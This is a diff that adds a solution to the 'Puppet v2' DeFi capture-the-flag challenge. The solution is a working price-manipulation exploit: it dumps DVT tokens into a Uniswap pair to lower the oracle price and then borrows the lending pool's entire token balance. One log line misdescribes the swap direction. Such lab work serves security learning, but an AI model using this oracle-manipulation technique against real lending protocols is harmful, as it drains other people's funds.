@@ -83,6 +83,51 @@ describe('[Challenge] Puppet v2', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        getRequireAmount = async (amount) => {
+            let requiredAmount = await lendingPool.calculateDepositOfWETHRequired(amount);
+            console.log(`borrow ${ethers.utils.formatEther(amount)} DVT required amount: ${ethers.utils.formatEther(requiredAmount)} WETH`);
+            return requiredAmount;
+        }
+        checkBalance = async () => {
+            console.log(`--------`);
+            console.log(`DVT.balance[player]   : ${ethers.utils.formatEther(await token.balanceOf(player.address))} DVT`);
+            console.log(`DVT.balance[uniswap]  : ${ethers.utils.formatEther(await token.balanceOf(uniswapExchange.address))} DVT`);
+            console.log(`DVT.balance[pool]     : ${ethers.utils.formatEther(await token.balanceOf(lendingPool.address))} DVT`);
+            console.log(`WETH.balance[player]  : ${ethers.utils.formatEther(await weth.balanceOf(player.address))} WETH`);
+            console.log(`WETH.balance[uniswap] : ${ethers.utils.formatEther(await weth.balanceOf(uniswapExchange.address))} WETH`);
+            console.log(`WETH.balance[pool]    : ${ethers.utils.formatEther(await weth.balanceOf(lendingPool.address))} WETH`);
+            console.log(`--------`);
+        }
+
+        console.log(`ETH.balance[player]: ${ethers.utils.formatEther(await ethers.provider.getBalance(player.address))} ETH`);
+        console.log(`Wrapping ETH...`);
+        let playerETH = ethers.utils.parseEther("19.9");
+        await weth.connect(player).deposit({value: playerETH});
+        await checkBalance();
+        let borrowAmount = await token.balanceOf(lendingPool.address);
+        await getRequireAmount(borrowAmount);
+
+        console.log(`Swapping WETH to DVT...`);
+        ///// https://docs.uniswap.org/contracts/v2/reference/smart-contracts/router-02#swapexacttokensfortokens
+        let exactAmountIn = await token.balanceOf(player.address);
+        let deadline = parseInt((await ethers.provider.getBlock('latest')).timestamp) + 1000;
+        let amountOutmin = 0;
+        await token.connect(player).approve(uniswapRouter.address, exactAmountIn);
+        await uniswapRouter.connect(player).swapExactTokensForTokens(
+            exactAmountIn,
+            amountOutmin,
+            [token.address, weth.address],
+            player.address,
+            deadline
+        );
+        await checkBalance();
+        
+        console.log(`Borrowing lending pool...`);
+        let requiredAmount = await getRequireAmount(borrowAmount);
+        console.log(`requiredAmount: ${ethers.utils.formatEther(requiredAmount)} WETH`);
+        await weth.connect(player).approve(lendingPool.address, requiredAmount);
+        await lendingPool.connect(player).borrow(borrowAmount);
+        await checkBalance();
     });
 
     after(async function () {
